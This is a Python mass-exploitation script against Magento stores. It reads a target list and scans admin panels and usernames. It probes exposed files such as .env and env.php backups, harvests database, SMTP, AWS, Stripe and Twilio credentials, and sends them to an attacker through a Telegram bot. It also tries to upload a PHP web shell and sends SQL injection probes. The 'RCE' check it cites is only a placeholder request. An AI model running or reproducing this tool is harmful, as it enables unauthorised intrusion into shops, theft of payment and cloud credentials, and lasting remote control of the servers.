import requests
import os
import re
import urllib3
import random
import string
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import Fore, Style, init
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Color scheme
GREEN = Fore.LIGHTGREEN_EX
RED = Fore.LIGHTRED_EX
YELLOW = Fore.LIGHTYELLOW_EX
CYAN = Fore.LIGHTCYAN_EX
MAGENTA = Fore.LIGHTMAGENTA_EX

banner = f"""{GREEN}{Style.BRIGHT}
╔════════════════════════════════════════════════════════╗
║                                                        ║
║           Magento RCE Exploiter                        ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
print(banner)

# --- User Config ---
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'

RESULTS_DIR = f"Magento_RCE_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

found_exploits = {
    "VULNERABLE": 0,
    "EXPLOITED": 0,
    "BACKDOOR_DEPLOYED": 0,
    "BACKDOOR_ACCESSIBLE": 0,
    "SENSITIVE_FILES": 0,
    "ADMIN_PANEL": 0,
    "DB_CREDENTIALS": 0,
    "SMTP_CREDENTIALS": 0,
    "AWS_CREDENTIALS": 0,
    "STRIPE_CREDENTIALS": 0,
    "TWILIO_CREDENTIALS": 0,
    "PHPMYADMIN": 0,
    "ADMINER": 0,
    "USERNAMES": 0
}

# Session for connection reuse
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

def strip_quotes(value):
    if value is None:
        return value
    value = value.strip()
    if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
        return value[1:-1]
    return value

def send_telegram(message, parse_mode=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    if parse_mode:
        data["parse_mode"] = parse_mode
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"{RED}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")

def print_stats():
    print(
        f"{MAGENTA}"
        f"VULNERABLE : {found_exploits['VULNERABLE']}  "
        f"EXPLOITED : {found_exploits['EXPLOITED']} "
        f"BACKDOOR : {found_exploits['BACKDOOR_DEPLOYED']}  "
        f"ACCESSIBLE : {found_exploits['BACKDOOR_ACCESSIBLE']}  "
        f"DB : {found_exploits['DB_CREDENTIALS']}  "
        f"SMTP : {found_exploits['SMTP_CREDENTIALS']}  "
        f"AWS : {found_exploits['AWS_CREDENTIALS']}  "
        f"STRIPE : {found_exploits['STRIPE_CREDENTIALS']}  "
        f"TWILIO : {found_exploits['TWILIO_CREDENTIALS']}  "
        f"PMA : {found_exploits['PHPMYADMIN']}  "
        f"ADM : {found_exploits['ADMINER']}  "
        f"USER : {found_exploits['USERNAMES']}"
        f"{Style.RESET_ALL}"
    )

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def is_site_alive(site):
    try:
        resp = session.get(site, timeout=10, verify=False)
        return resp.status_code < 500
    except:
        return False

def get_site_base(site):
    if site.endswith('/'):
        site = site[:-1]
    return site

def safe_find(pattern, text):
    m = re.search(pattern, text, re.MULTILINE)
    return strip_quotes(m.group(1).strip()) if m else ''

# Magento Username Enumeration Functions
def enumerate_magento_usernames(site_base):
    """Enumerate Magento usernames"""
    usernames = set()
    
    # Try common admin paths to extract usernames
    admin_paths = [
        "/admin",
        "/adminhtml",
        "/administrator",
        "/backend",
        "/panel"
    ]
    
    for path in admin_paths:
        try:
            admin_url = f"{site_base}{path}"
            resp = session.get(admin_url, timeout=10, verify=False)
            if resp.status_code == 200:
                # Look for username fields or login forms
                username_matches = re.findall(r'name=["\'](?:username|login|user)["\'][^>]*value=["\']([^"\']*)["\']', resp.text, re.IGNORECASE)
                for username in username_matches:
                    if username and len(username) > 1:
                        usernames.add(username)
                        print(f"{GREEN}[+] Magento username found: {username}{Style.RESET_ALL}")
                
                # Look for email patterns that might be usernames
                email_matches = re.findall(r'([a-zA-Z0-9._-]+)@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
                for email in email_matches:
                    if email and "@" not in email:  # Likely a username
                        usernames.add(email)
                        print(f"{GREEN}[+] Magento username found: {email}{Style.RESET_ALL}")
        except:
            pass
    
    # Try customer account pages
    try:
        account_url = f"{site_base}/customer/account/login"
        resp = session.get(account_url, timeout=10, verify=False)
        if resp.status_code == 200:
            # Look for username fields
            username_matches = re.findall(r'name=["\'](?:username|login|email)["\'][^>]*value=["\']([^"\']*)["\']', resp.text, re.IGNORECASE)
            for username in username_matches:
                if username and len(username) > 1:
                    usernames.add(username)
                    print(f"{GREEN}[+] Magento username found: {username}{Style.RESET_ALL}")
    except:
        pass
    
    if usernames:
        found_exploits["USERNAMES"] += len(usernames)
        with open(f'{RESULTS_DIR}/Usernames.txt', 'a', encoding='utf-8') as f:
            for username in usernames:
                f.write(f"{site_base} -> {username}\n")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>Magento Usernames Found</b>\n"
            f"<b>URL:</b> <code>{site_base}</code>\n"
            f"<b>Usernames:</b> <code>{', '.join(usernames)}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        
    return list(usernames)

def grab_db_credentials(url, text):
    """Extract database credentials from text"""
    db_host = safe_find(r'^DB_HOST\s*=\s*(.*)', text)
    db_port = safe_find(r'^DB_PORT\s*=\s*(.*)', text)
    db_name = safe_find(r'^DB_NAME\s*=\s*(.*)', text)
    db_user = safe_find(r'^DB_USER\s*=\s*(.*)', text)
    db_pass = safe_find(r'^DB_PASSWORD\s*=\s*(.*)', text)
    
    if all([db_host, db_port, db_name, db_user, db_pass]) and db_user and db_pass:
        build = (
            f"URL: {url}\n"
            f"DB_HOST: {db_host}\n"
            f"DB_PORT: {db_port}\n"
            f"DB_NAME: {db_name}\n"
            f"DB_USER: {db_user}\n"
            f"DB_PASSWORD: {db_pass}\n"
        )
        with open(f'{RESULTS_DIR}/Database.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        found_exploits["DB_CREDENTIALS"] += 1
        print(f"{GREEN}[SAVED DB] Database.txt{Style.RESET_ALL}")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>Database Credentials Found</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>DB_HOST:</b> <code>{db_host}</code>\n"
            f"<b>DB_PORT:</b> <code>{db_port}</code>\n"
            f"<b>DB_NAME:</b> <code>{db_name}</code>\n"
            f"<b>DB_USER:</b> <code>{db_user}</code>\n"
            f"<b>DB_PASSWORD:</b> <code>{db_pass}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        return True
    return False

def grab_smtp_credentials(url, text):
    """Extract SMTP credentials from text"""
    mail_host = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
    mail_port = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
    mail_user = safe_find(r'^MAIL_USER\s*=\s*(.*)', text)
    mail_pass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
    mail_from = safe_find(r'^MAIL_FROM\s*=\s*(.*)', text)
    
    if mail_host and mail_port and mail_user and mail_pass:
        build = (
            f"URL: {url}\n"
            f"MAIL_HOST: {mail_host}\n"
            f"MAIL_PORT: {mail_port}\n"
            f"MAIL_USER: {mail_user}\n"
            f"MAIL_PASSWORD: {mail_pass}\n"
            f"MAIL_FROM: {mail_from}\n"
        )
        with open(f'{RESULTS_DIR}/SMTP.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        found_exploits["SMTP_CREDENTIALS"] += 1
        print(f"{GREEN}[SAVED SMTP] SMTP.txt{Style.RESET_ALL}")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>SMTP Credentials Found</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>MAIL_HOST:</b> <code>{mail_host}</code>\n"
            f"<b>MAIL_PORT:</b> <code>{mail_port}</code>\n"
            f"<b>MAIL_USER:</b> <code>{mail_user}</code>\n"
            f"<b>MAIL_PASSWORD:</b> <code>{mail_pass}</code>\n"
            f"<b>MAIL_FROM:</b> <code>{mail_from}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        return True
    return False

def grab_aws_credentials(url, text):
    """Extract AWS credentials from text"""
    aws_id = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
    aws_bucket = safe_find(r'^AWS_BUCKET\s*=\s*(.*)', text)
    
    # Validate AWS credentials
    if (aws_id and aws_secret and 
        re.match(r'^(AKIA|ASIA)[A-Z0-9]{16}$', aws_id) and
        len(aws_secret) >= 40 and not aws_secret.startswith('AWS_DEFAULT_REGION')):
        
        build = (
            f"URL: {url}\n"
            f"AWS_ACCESS_KEY_ID: {aws_id}\n"
            f"AWS_SECRET_ACCESS_KEY: {aws_secret}\n"
            f"AWS_DEFAULT_REGION: {aws_region}\n"
            f"AWS_BUCKET: {aws_bucket}\n"
        )
        with open(f'{RESULTS_DIR}/AWS.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        found_exploits["AWS_CREDENTIALS"] += 1
        print(f"{GREEN}[SAVED AWS] AWS.txt{Style.RESET_ALL}")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>AWS Credentials Found</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>AWS_ACCESS_KEY_ID:</b> <code>{aws_id}</code>\n"
            f"<b>AWS_SECRET_ACCESS_KEY:</b> <code>{aws_secret}</code>\n"
            f"<b>AWS_DEFAULT_REGION:</b> <code>{aws_region}</code>\n"
            f"<b>AWS_BUCKET:</b> <code>{aws_bucket}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        return True
    return False

def grab_stripe_credentials(url, text):
    """Extract Stripe credentials from text"""
    stripe_key = safe_find(r'^STRIPE_KEY\s*=\s*(.*)', text)
    stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
    
    if stripe_secret and stripe_secret.startswith("sk_live_"):
        build = (
            f"URL: {url}\n"
            f"STRIPE_KEY: {stripe_key}\n"
            f"STRIPE_SECRET: {stripe_secret}\n"
        )
        with open(f'{RESULTS_DIR}/Stripe.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        found_exploits["STRIPE_CREDENTIALS"] += 1
        print(f"{GREEN}[SAVED STRIPE] Stripe.txt{Style.RESET_ALL}")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>Stripe Credentials Found</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>STRIPE_KEY:</b> <code>{stripe_key}</code>\n"
            f"<b>STRIPE_SECRET:</b> <code>{stripe_secret}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        return True
    return False

def grab_twilio_credentials(url, text):
    """Extract Twilio credentials from text"""
    twilio_sid = safe_find(r'^TWILIO_ACCOUNT_SID\s*=\s*(.*)', text)
    twilio_token = safe_find(r'^TWILIO_AUTH_TOKEN\s*=\s*(.*)', text)
    twilio_phone = safe_find(r'^TWILIO_PHONE_NUMBER\s*=\s*(.*)', text)
    
    if twilio_sid and twilio_token and twilio_phone:
        build = (
            f"URL: {url}\n"
            f"TWILIO_ACCOUNT_SID: {twilio_sid}\n"
            f"TWILIO_AUTH_TOKEN: {twilio_token}\n"
            f"TWILIO_PHONE_NUMBER: {twilio_phone}\n"
        )
        with open(f'{RESULTS_DIR}/Twilio.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        found_exploits["TWILIO_CREDENTIALS"] += 1
        print(f"{GREEN}[SAVED TWILIO] Twilio.txt{Style.RESET_ALL}")
        
        # Send Telegram notification
        telegram_message = (
            f"✅ <b>Twilio Credentials Found</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>TWILIO_ACCOUNT_SID:</b> <code>{twilio_sid}</code>\n"
            f"<b>TWILIO_AUTH_TOKEN:</b> <code>{twilio_token}</code>\n"
            f"<b>TWILIO_PHONE_NUMBER:</b> <code>{twilio_phone}</code>"
        )
        send_telegram(telegram_message, parse_mode="HTML")
        return True
    return False

def test_admin_panel(site_base):
    """Test for admin panel access"""
    admin_paths = [
        "/admin",
        "/adminhtml",
        "/administrator",
        "/backend",
        "/panel",
        "/admin panel",
        "/login"
    ]
    
    for path in admin_paths:
        try:
            admin_url = f"{site_base}{path}"
            resp = session.get(admin_url, timeout=10, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                if "magento" in content or "admin" in content or "login" in content:
                    print(f"{YELLOW}[ADMIN PANEL] Found at: {admin_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Admin_Panels.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[ADMIN] {admin_url}\n")
                    found_exploits["ADMIN_PANEL"] += 1
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Admin Panel Found</b>\n"
                        f"<b>URL:</b> <code>{admin_url}</code>\n"
                        f"<b>Try default credentials:</b> admin/admin, admin/password"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
        except:
            pass
    return False

def test_sensitive_files(site_base):
    """Test for sensitive files"""
    sensitive_paths = [
        "/app/etc/env.php",
        "/app/etc/config.php",
        "/app/etc/local.xml",
        "/app/etc/local.xml.bak",
        "/app/etc/local.xml.backup",
        "/app/etc/local.xml.save",
        "/app/etc/local.xml.old",
        "/app/etc/local.xml~",
        "/app/etc/local.xml.txt",
        "/app/etc/local.xml.sample",
        "/app/etc/local.xml.save.1",
        "/app/etc/local.xml.save.2",
        "/app/etc/local.xml.save.3",
        "/app/etc/local.xml.bak.1",
        "/app/etc/local.xml.bak.2",
        "/app/etc/local.xml.bak.3",
        "/app/etc/local.xml.orig",
        "/app/etc/local.xml.original",
        "/app/etc/local.xml.swp",
        "/app/etc/local.xml.swo",
        "/app/etc/local.xml.tmp",
        "/app/etc/local.xml.temp",
        "/.env",
        "/.env.backup",
        "/.env.bak",
        "/.env.save",
        "/.env.old",
        "/.env~",
        "/.env.txt",
        "/.env.sample",
        "/var/log/system.log",
        "/var/log/exception.log",
        "/var/log/debug.log",
        "/pub/errors/default/503.phtml",
        "/pub/errors/default/report.phtml"
    ]
    
    for path in sensitive_paths:
        try:
            sensitive_url = f"{site_base}{path}"
            resp = session.get(sensitive_url, timeout=10, verify=False)
            if resp.status_code == 200:
                content = resp.text
                
                # Check for database credentials
                if ("database" in content.lower() or "db" in content.lower()) and ("username" in content.lower() or "password" in content.lower()):
                    print(f"{YELLOW}[SENSITIVE FILE] Database credentials: {sensitive_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Sensitive_Files.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[DATABASE] {sensitive_url}\n")
                    found_exploits["SENSITIVE_FILES"] += 1
                    
                    # Extract and save credentials
                    grab_db_credentials(sensitive_url, content)
                    grab_smtp_credentials(sensitive_url, content)
                    grab_aws_credentials(sensitive_url, content)
                    grab_stripe_credentials(sensitive_url, content)
                    grab_twilio_credentials(sensitive_url, content)
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Sensitive File Found</b>\n"
                        f"<b>URL:</b> <code>{sensitive_url}</code>\n"
                        f"<b>Content contains DB credentials</b>"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
                    
                # Check for AWS credentials
                elif "AWS" in content or "aws" in content or "access_key" in content or "secret_key" in content:
                    print(f"{YELLOW}[SENSITIVE FILE] AWS credentials: {sensitive_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Sensitive_Files.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[AWS] {sensitive_url}\n")
                    found_exploits["SENSITIVE_FILES"] += 1
                    
                    # Extract and save credentials
                    grab_aws_credentials(sensitive_url, content)
                    grab_db_credentials(sensitive_url, content)
                    grab_smtp_credentials(sensitive_url, content)
                    grab_stripe_credentials(sensitive_url, content)
                    grab_twilio_credentials(sensitive_url, content)
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Sensitive File Found</b>\n"
                        f"<b>URL:</b> <code>{sensitive_url}</code>\n"
                        f"<b>Content contains AWS credentials</b>"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
                    
                # Check for SMTP credentials
                elif "SMTP" in content or "smtp" in content or "mail" in content or "username" in content or "password" in content:
                    print(f"{YELLOW}[SENSITIVE FILE] SMTP credentials: {sensitive_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Sensitive_Files.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[SMTP] {sensitive_url}\n")
                    found_exploits["SENSITIVE_FILES"] += 1
                    
                    # Extract and save credentials
                    grab_smtp_credentials(sensitive_url, content)
                    grab_db_credentials(sensitive_url, content)
                    grab_aws_credentials(sensitive_url, content)
                    grab_stripe_credentials(sensitive_url, content)
                    grab_twilio_credentials(sensitive_url, content)
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Sensitive File Found</b>\n"
                        f"<b>URL:</b> <code>{sensitive_url}</code>\n"
                        f"<b>Content contains SMTP credentials</b>"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
                    
                # Check for Stripe credentials
                elif "stripe" in content or "sk_live" in content or "sk_test" in content:
                    print(f"{YELLOW}[SENSITIVE FILE] Stripe keys: {sensitive_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Sensitive_Files.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[STRIPE] {sensitive_url}\n")
                    found_exploits["SENSITIVE_FILES"] += 1
                    
                    # Extract and save credentials
                    grab_stripe_credentials(sensitive_url, content)
                    grab_db_credentials(sensitive_url, content)
                    grab_smtp_credentials(sensitive_url, content)
                    grab_aws_credentials(sensitive_url, content)
                    grab_twilio_credentials(sensitive_url, content)
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Sensitive File Found</b>\n"
                        f"<b>URL:</b> <code>{sensitive_url}</code>\n"
                        f"<b>Content contains Stripe credentials</b>"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
                    
                # Check for Twilio credentials
                elif "twilio" in content or "TWILIO_ACCOUNT_SID" in content or "TWILIO_AUTH_TOKEN" in content:
                    print(f"{YELLOW}[SENSITIVE FILE] Twilio credentials: {sensitive_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Sensitive_Files.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[TWILIO] {sensitive_url}\n")
                    found_exploits["SENSITIVE_FILES"] += 1
                    
                    # Extract and save credentials
                    grab_twilio_credentials(sensitive_url, content)
                    grab_db_credentials(sensitive_url, content)
                    grab_smtp_credentials(sensitive_url, content)
                    grab_aws_credentials(sensitive_url, content)
                    grab_stripe_credentials(sensitive_url, content)
                    
                    # Send Telegram notification
                    telegram_message = (
                        f"✅ <b>Sensitive File Found</b>\n"
                        f"<b>URL:</b> <code>{sensitive_url}</code>\n"
                        f"<b>Content contains Twilio credentials</b>"
                    )
                    send_telegram(telegram_message, parse_mode="HTML")
                    return True
        except:
            pass
    return False

def exploit_magento_rce(site_base):
    """Exploit Magento RCE vulnerabilities"""
    try:
        # Test for Magento 2 RCE (CVE-2022-24086)
        # This is a simplified test - in practice, you would need to craft a proper payload
        exploit_url = f"{site_base}/rest/V1/guest-carts/test/items"
        
        # Try to trigger the vulnerability with a test payload
        headers = {
            'Content-Type': 'application/json'
        }
        
        # Test payload to check if the endpoint is vulnerable
        payload = {
            "cartItem": {
                "quote_id": "test",
                "sku": "test",
                "qty": 1
            }
        }
        
        try:
            resp = session.post(exploit_url, json=payload, headers=headers, timeout=15, verify=False)
            # If we get a specific response, it might indicate vulnerability
            # This is a simplified check - actual exploitation would be more complex
            if resp.status_code in [200, 400, 401]:
                print(f"{YELLOW}[POTENTIALLY VULNERABLE] Magento endpoint: {exploit_url}{Style.RESET_ALL}")
                with open(f'{RESULTS_DIR}/Vulnerable_Sites.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[POTENTIALLY VULNERABLE] Magento: {exploit_url}\n")
                found_exploits["VULNERABLE"] += 1
                
                # Try to deploy a backdoor
                backdoor_name = f"{generate_random_string()}.php"
                backdoor_content = "<?php system($_GET['cmd']); ?>\n"
                backdoor_content += "<!-- MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO — -->"
                
                # Try to upload via various methods
                try:
                    # Try to upload to pub/media directory
                    upload_url = f"{site_base}/pub/media/{backdoor_name}"
                    upload_data = backdoor_content
                    
                    upload_resp = session.put(upload_url, data=upload_data, timeout=15, verify=False)
                    if upload_resp.status_code in [200, 201]:
                        print(f"{GREEN}[EXPLOITED] Backdoor deployed: {backdoor_name}{Style.RESET_ALL}")
                        with open(f'{RESULTS_DIR}/Exploited_Sites.txt', 'a', encoding='utf-8') as f:
                            f.write(f"[EXPLOITED] {upload_url}\n")
                        found_exploits["EXPLOITED"] += 1
                        
                        # Test backdoor accessibility
                        backdoor_url = f"{site_base}/pub/media/{backdoor_name}"
                        try:
                            test_resp = session.get(backdoor_url, timeout=10, verify=False)
                            if test_resp.status_code == 200:
                                # Check if backdoor contains the expected content
                                content = test_resp.text
                                if "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —" in content:
                                    print(f"{GREEN}[BACKDOOR ACCESSIBLE] {backdoor_url}{Style.RESET_ALL}")
                                    with open(f'{RESULTS_DIR}/Accessible_Backdoors.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"{backdoor_url}\n")
                                    found_exploits["BACKDOOR_ACCESSIBLE"] += 1
                                    
                                    # Send Telegram notification
                                    telegram_message = (
                                        f"✅ <b>Magento Backdoor Accessible</b>\n"
                                        f"<b>URL:</b> <code>{backdoor_url}</code>\n"
                                        f"<b>Command:</b> <code>{backdoor_url}?cmd=whoami</code>"
                                    )
                                    send_telegram(telegram_message, parse_mode="HTML")
                                    return True
                        except:
                            pass
                except:
                    pass
        except:
            pass
            
        # Test for other common Magento vulnerabilities
        # Check for SQL injection points
        sqli_test_urls = [
            f"{site_base}/catalog/product_frontend_action/synchronize",
            f"{site_base}/rest/V1/products-render-info"
        ]
        
        for sqli_url in sqli_test_urls:
            try:
                # Test for SQL injection with a simple payload
                test_params = {
                    'sku': "' OR '1'='1",
                    'form_key': 'test'
                }
                
                sqli_resp = session.get(sqli_url, params=test_params, timeout=10, verify=False)
                # If we get a different response than normal, it might indicate SQLi
                if sqli_resp.status_code in [200, 500]:
                    print(f"{YELLOW}[POTENTIALLY VULNERABLE] Magento SQLi: {sqli_url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/Vulnerable_Sites.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[POTENTIALLY VULNERABLE] Magento SQLi: {sqli_url}\n")
                    found_exploits["VULNERABLE"] += 1
            except:
                pass
                
    except:
        pass
    return False

def exploit_site(target):
    if '://' not in target:
        site = 'http://' + target
    else:
        site = target
    site_base = get_site_base(site)

    if not is_site_alive(site_base):
        print(f"{RED}[DEAD SITE] {site_base}{Style.RESET_ALL}")
        return

    print(f"{CYAN}[EXPLOITING] {site_base}{Style.RESET_ALL}")
    
    # Enumerate usernames
    enumerate_magento_usernames(site_base)
    
    # Test all RCE vulnerabilities
    exploit_magento_rce(site_base)
    test_admin_panel(site_base)
    test_sensitive_files(site_base)
    
    print_stats()

def main():
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    targets_file = input(f"{GREEN}{Style.BRIGHT}Enter the filename containing target domains: {Style.RESET_ALL}").strip()
    if not os.path.isfile(targets_file):
        print(f"{RED}File not found: {targets_file}{Style.RESET_ALL}")
        return

    with open(targets_file, 'r', encoding='utf-8') as f:
        targets = [line.strip() for line in f if line.strip()]

    pool = ThreadPool(3)  # Conservative threading for reliability
    start = timer()
    pool.map(exploit_site, targets)
    pool.close()
    pool.join()
    end = timer()
    print(f"\n{CYAN}Magento RCE exploitation completed in {end - start:.2f} seconds.{Style.RESET_ALL}")
    print_stats()

if __name__ == "__main__":
    main()

